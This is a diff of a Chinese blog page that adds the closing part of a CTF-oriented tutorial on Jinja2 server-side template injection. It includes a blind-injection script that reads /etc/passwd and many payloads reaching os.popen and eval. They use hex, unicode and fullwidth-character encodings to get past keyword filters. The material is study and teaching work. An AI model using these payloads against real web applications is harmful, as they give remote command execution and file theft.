+<p><img src="http://yuhaojiang.gitee.io/picture/%E7%BB%86%E8%AF%B4Jinja2%E4%B9%8BSSTI&bypass/image-20201128122047252.png" alt="image-20201128122047252"></p>
+<ul>
+<li>盲注</li>
+</ul>
+<p>如果上面的方法不行的话，可以考虑使用盲注的方式，这里附上p0师傅的脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://ip:5000/?name=&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span>(<span class="params">payload</span>):</span></span><br><span class="line">    r = requests.get(url+payload).content</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;kawhi&#x27;</span> <span class="keyword">in</span> r</span><br><span class="line"></span><br><span class="line">password  = <span class="string">&#x27;&#x27;</span></span><br><span class="line">s = <span class="string">r&#x27;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!&quot;$\&#x27;()*+,-./:;&lt;=&gt;?@[\\]^`&#123;|&#125;~\&#x27;&quot;_%&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>,<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> s:</span><br><span class="line">        payload = <span class="string">&#x27;&#123;% if ().__class__.__bases__[0].__subclasses__()[40].__init__.__globals__.__builtins__.open(&quot;/etc/passwd&quot;).read()[&#x27;</span>+str(i)+<span class="string">&#x27;:&#x27;</span>+str(i+<span class="number">1</span>)+<span class="string">&#x27;] == &quot;&#x27;</span>+c+<span class="string">&#x27;&quot; %&#125;kawhi&#123;% endif %&#125;&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> check(payload):</span><br><span class="line">            password += c</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">print</span> password</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>print</code>标记</li>
+</ul>
+<p>我们上面之所以要dnslog外带数据以及使用盲注，是因为用<code>&#123;%%&#125;`会没有回显，这里的话可以使用`print`来做一个标记使得他有回显，比如`&#123;%print config%&#125;</code>，payload如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;%<span class="keyword">print</span> ().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()&quot;</span>)%&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="payload进阶与拓展"><a href="#payload进阶与拓展" class="headerlink" title="payload进阶与拓展"></a>payload进阶与拓展</h2><p>这里我基于上面绕过黑名单各种方法的组合，对CTF中用到的一些方法和payload再做一个小的总结，不过其实一般来说，只要不是太偏太绕的题，上面的方法自行组合一下都够用了，下面只是作为一个拓展</p>
+<h3 id="过滤-和-和-39"><a href="#过滤-和-和-39" class="headerlink" title="过滤_和.和&#39;"></a>过滤<code>_</code>和<code>.</code>和<code>&#39;</code></h3><p>这里顺便给一个不常见的方法，主要是找到<code>_frozen_importlib_external.FileLoader</code>的<code>get_data()</code>方法，第一个是参数0，第二个为要读取的文件名，payload如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">222</span>].get_data(<span class="number">0</span>,<span class="string">&quot;app.py&quot;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>使用十六进制绕过后，payload如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;()[<span class="string">&quot;\x5f\x5fclass\x5f\x5f&quot;</span>][<span class="string">&quot;\x5F\x5Fbases\x5F\x5F&quot;</span>][<span class="number">0</span>][<span class="string">&quot;\x5F\x5Fsubclasses\x5F\x5F&quot;</span>]()[<span class="number">222</span>][<span class="string">&quot;get\x5Fdata&quot;</span>](<span class="number">0</span>, <span class="string">&quot;app\x2Epy&quot;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="过滤args和-和"><a href="#过滤args和-和" class="headerlink" title="过滤args和.和_"></a>过滤<code>args</code>和<code>.</code>和<code>_</code></h3><p>之前安恒二月赛在y1ng师傅博客看到的一个payload，原理并不难，这里使用了<code>attr()</code>绕过点，<code>values</code>绕过<code>args</code>，payload如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;()|attr(request[<span class="string">&#x27;values&#x27;</span>][<span class="string">&#x27;x1&#x27;</span>])|attr(request[<span class="string">&#x27;values&#x27;</span>][<span class="string">&#x27;x2&#x27;</span>])|attr(request[<span class="string">&#x27;values&#x27;</span>][<span class="string">&#x27;x3&#x27;</span>])()|attr(request[<span class="string">&#x27;values&#x27;</span>][<span class="string">&#x27;x4&#x27;</span>])(<span class="number">40</span>)|attr(request[<span class="string">&#x27;values&#x27;</span>][<span class="string">&#x27;x5&#x27;</span>])|attr(request[<span class="string">&#x27;values&#x27;</span>][<span class="string">&#x27;x6&#x27;</span>])|attr(request[<span class="string">&#x27;values&#x27;</span>][<span class="string">&#x27;x4&#x27;</span>])(request[<span class="string">&#x27;values&#x27;</span>][<span class="string">&#x27;x7&#x27;</span>])|attr(request[<span class="string">&#x27;values&#x27;</span>][<span class="string">&#x27;x4&#x27;</span>])(request[<span class="string">&#x27;values&#x27;</span>][<span class="string">&#x27;x8&#x27;</span>])(request[<span class="string">&#x27;values&#x27;</span>][<span class="string">&#x27;x9&#x27;</span>])&#125;&#125;</span><br><span class="line"></span><br><span class="line">post:x1=__class__&amp;x2=__base__&amp;x3=__subclasses__&amp;x4=__getitem__&amp;x5=__init__&amp;x6=__globals__&amp;x7=__builtins__&amp;x8=eval&amp;x9=__import__(<span class="string">&quot;os&quot;</span>).popen(<span class="string">&#x27;whoami&#x27;</span>).read()</span><br></pre></td></tr></table></figure>
+
+<h3 id="导入主函数读取变量"><a href="#导入主函数读取变量" class="headerlink" title="导入主函数读取变量"></a>导入主函数读取变量</h3><p>有一些题目我们不并需要去getshell，比如flag直接暴露在变量里面了，像如下这样把<code>/flag</code>文件加载到flag这个变量里面了</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">f = open(<span class="string">&#x27;/flag&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">flag = f.read()</span><br></pre></td></tr></table></figure>
+
+<p>我们就可以通过<code>import</code>是导入<code>__main__</code>主函数去读变量，payload如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;%<span class="keyword">print</span> request.application.__globals__.__getitem__(<span class="string">&#x27;__builtins__&#x27;</span>).__getitem__(<span class="string">&#x27;__import__&#x27;</span>)(<span class="string">&#x27;__main__&#x27;</span>).flag %&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="Unicode绕过"><a href="#Unicode绕过" class="headerlink" title="Unicode绕过"></a>Unicode绕过</h3><p>这种方法是从<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8581#toc-4">安洵杯2020 官方Writeup</a>学到的，我们直奔主题看payload</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;%print(lipsum|attr(%<span class="number">22</span>\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f%<span class="number">22</span>))|attr(%<span class="number">22</span>\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f%<span class="number">22</span>)(%<span class="number">22</span>os%<span class="number">22</span>)|attr(%<span class="number">22</span>popen%<span class="number">22</span>)(%<span class="number">22</span>whoami%<span class="number">22</span>)|attr(%<span class="number">22</span>read%<span class="number">22</span>)()%&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里的<code>print</code>绕过<code>&#123;&#123;&#125;&#125;`和`attr`绕过`.`上面已经说过了这里不赘述
+
+然后这里的`lipsum`用`&#123;&#123;lipsum&#125;&#125;</code>测了一下发现是个方法</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;function generate_lorem_ipsum at 0x7fcddfa296a8&gt;</span><br></pre></td></tr></table></figure>
+
+<p>然后用他直接调用<code>__globals__</code>发现可以直接执行os命令，测了一下发现<code>__builtins__</code>也可以用，又学到了一种新方法，只能说师傅们tql</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;lipsum.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;whoami&#x27;</span>).read()&#125;&#125;</span><br><span class="line">&#123;&#123;lipsum.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()&quot;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>回到正题，这里使用了Unicode编码绕过关键字，下面两行是等价的</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;()|attr(<span class="string">&quot;__class__&quot;</span>)&#125;&#125;</span><br><span class="line">&#123;&#123;()|attr(<span class="string">&quot;\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f&quot;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>知道了这两点之后，那个官方给的payload就很明朗了，解开编码后如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;%print(lipsum|attr(<span class="string">&quot;__globals__&quot;</span>))|attr(<span class="string">&quot;__getitem__&quot;</span>)(<span class="string">&quot;os&quot;</span>)|attr(<span class="string">&quot;popen&quot;</span>)(<span class="string">&quot;whoami&quot;</span>)|attr(<span class="string">&quot;read&quot;</span>)()%&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后我这里顺便给个Unicode互转的php脚本</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//字符串转Unicode编码</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">unicode_encode</span>(<span class="params">$strLong</span>) </span>&#123;</span><br><span class="line">  $strArr = preg_split(<span class="string">&#x27;/(?&lt;!^)(?!$)/u&#x27;</span>, $strLong);<span class="comment">//拆分字符串为数组(含中文字符)</span></span><br><span class="line">  $resUnicode = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">  <span class="keyword">foreach</span> ($strArr <span class="keyword">as</span> $str)</span><br><span class="line">  &#123;</span><br><span class="line">      $bin_str = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">      $arr = is_array($str) ? $str : str_split($str);<span class="comment">//获取字符内部数组表示,此时$arr应类似array(228, 189, 160)</span></span><br><span class="line">      <span class="keyword">foreach</span> ($arr <span class="keyword">as</span> $value)</span><br><span class="line">      &#123;</span><br><span class="line">          $bin_str .= decbin(ord($value));<span class="comment">//转成数字再转成二进制字符串,$bin_str应类似111001001011110110100000,如果是汉字&quot;你&quot;</span></span><br><span class="line">      &#125;</span><br><span class="line">      $bin_str = preg_replace(<span class="string">&#x27;/^.&#123;4&#125;(.&#123;4&#125;).&#123;2&#125;(.&#123;6&#125;).&#123;2&#125;(.&#123;6&#125;)$/&#x27;</span>, <span class="string">&#x27;$1$2$3&#x27;</span>, $bin_str);<span class="comment">//正则截取, $bin_str应类似0100111101100000,如果是汉字&quot;你&quot;</span></span><br><span class="line">      $unicode = dechex(bindec($bin_str));<span class="comment">//返回unicode十六进制</span></span><br><span class="line">      $_sup = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">      <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; <span class="number">4</span> - strlen($unicode); $i++)</span><br><span class="line">      &#123;</span><br><span class="line">          $_sup .= <span class="string">&#x27;0&#x27;</span>;<span class="comment">//补位高字节 0</span></span><br><span class="line">      &#125;</span><br><span class="line">      $str =  <span class="string">&#x27;\\u&#x27;</span> . $_sup . $unicode; <span class="comment">//加上 \u  返回</span></span><br><span class="line">      $resUnicode .= $str;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> $resUnicode;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//Unicode编码转字符串方法1</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">unicode_decode</span>(<span class="params">$name</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="comment">// 转换编码，将Unicode编码转换成可以浏览的utf-8编码</span></span><br><span class="line">  $pattern = <span class="string">&#x27;/([\w]+)|(\\\u([\w]&#123;4&#125;))/i&#x27;</span>;</span><br><span class="line">  preg_match_all($pattern, $name, $matches);</span><br><span class="line">  <span class="keyword">if</span> (!<span class="keyword">empty</span>($matches))</span><br><span class="line">  &#123;</span><br><span class="line">    $name = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> ($j = <span class="number">0</span>; $j &lt; count($matches[<span class="number">0</span>]); $j++)</span><br><span class="line">    &#123;</span><br><span class="line">      $str = $matches[<span class="number">0</span>][$j];</span><br><span class="line">      <span class="keyword">if</span> (strpos($str, <span class="string">&#x27;\\u&#x27;</span>) === <span class="number">0</span>)</span><br><span class="line">      &#123;</span><br><span class="line">        $code = base_convert(substr($str, <span class="number">2</span>, <span class="number">2</span>), <span class="number">16</span>, <span class="number">10</span>);</span><br><span class="line">        $code2 = base_convert(substr($str, <span class="number">4</span>), <span class="number">16</span>, <span class="number">10</span>);</span><br><span class="line">        $c = chr($code).chr($code2);</span><br><span class="line">        $c = iconv(<span class="string">&#x27;UCS-2&#x27;</span>, <span class="string">&#x27;UTF-8&#x27;</span>, $c);</span><br><span class="line">        $name .= $c;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        $name .= $str;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> $name;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//Unicode编码转字符串</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">unicode_decode2</span>(<span class="params">$str</span>)</span>&#123;</span><br><span class="line">  $json = <span class="string">&#x27;&#123;&quot;str&quot;:&quot;&#x27;</span> . $str . <span class="string">&#x27;&quot;&#125;&#x27;</span>;</span><br><span class="line">  $arr = json_decode($json, <span class="literal">true</span>);</span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">empty</span>($arr)) <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">  <span class="keyword">return</span> $arr[<span class="string">&#x27;str&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> unicode_encode(<span class="string">&#x27;__class__&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> unicode_decode(<span class="string">&#x27;\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f&#x27;</span>);</span><br><span class="line"><span class="comment">//\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f__class__</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="魔改字符"><a href="#魔改字符" class="headerlink" title="魔改字符"></a>魔改字符</h3><p>这种方法是在太湖杯easyWeb这道题目学到的，上面所说的过滤双大括号，在一些特定的题目可以魔改<code>&#123;&#123;&#125;&#125;</code>，比如说这道题由于有个字符规范器可以把我们输入的文本标准化，所以可以使用这种方法</p>
+<p><img src="http://yuhaojiang.gitee.io/picture/%E7%BB%86%E8%AF%B4Jinja2%E4%B9%8BSSTI&bypass/image-20201128122905610.png" alt="image-20201128122905610"></p>
+<p>可以在Unicode字符网站寻找绕过的字符，直接在网址搜索<code>&#123;</code>，就会出现类似的字符，就可以找到<code>︷</code>和<code>︸</code>了，网址：<a target="_blank" rel="noopener" href="https://www.compart.com/en/unicode/U+FE38">https://www.compart.com/en/unicode/U+FE38</a></p>
+<p>payload如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">︷︷config︸︸</span><br><span class="line">%EF%B8%B7%EF%B8%B7config%EF%B8%B8%EF%B8%B8</span><br></pre></td></tr></table></figure>
+
+<p>还可以使用中文的字符魔改</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">｛	&amp;#65371;</span><br><span class="line">｝	&amp;#65373;</span><br><span class="line">［	&amp;#65339;</span><br><span class="line">］	&amp;#65341;</span><br><span class="line">＇	&amp;#65287;</span><br><span class="line">＂	&amp;#65282;</span><br></pre></td></tr></table></figure>
+
+<p>payload如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">｛｛url_for.__globals__［＇__builtins__＇］［＇eval＇］（＇__import__（＂os＂）.popen（＂cat &#x2F;flag＂）.read（）＇）｝｝ </span><br></pre></td></tr></table></figure>
+
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>因为水平和文章篇幅有限，可能还有一些bypass方法没有提到，还有就是CTF中也不只考Jinja2这种模板，还有另外的Twig模板，smart等模板，这些就等以后有必要再更吧，最后就是有不足之处请各位师傅指出</p>
+<h2 id="参考连接"><a href="#参考连接" class="headerlink" title="参考连接"></a>参考连接</h2><p><a target="_blank" rel="noopener" href="https://p0sec.net/index.php/archives/120/">https://p0sec.net/index.php/archives/120/</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/a736e39c3510">https://www.jianshu.com/p/a736e39c3510</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.redmango.top/article/43">https://www.redmango.top/article/43</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8029">https://xz.aliyun.com/t/8029</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7746">https://xz.aliyun.com/t/7746</a></p>
+
       
     </div>
 
@@ -1196,7 +2032,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">34</span>
+          <span class="site-state-item-count">33</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -1243,7 +2079,7 @@
 <div class="copyright">
   
   &copy; 
-  <span itemprop="copyrightYear">2020</span>
+  <span itemprop="copyrightYear">2021</span>
   <span class="with-love">
     <i class="fa fa-heart"></i>
   </span>
@@ -1252,12 +2088,12 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-chart-area"></i>
     </span>
-    <span title="站点总字数">324k</span>
+    <span title="站点总字数">315k</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">4:54</span>
+    <span title="站点阅读时长">4:46</span>
 </div>
   <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
   </div>
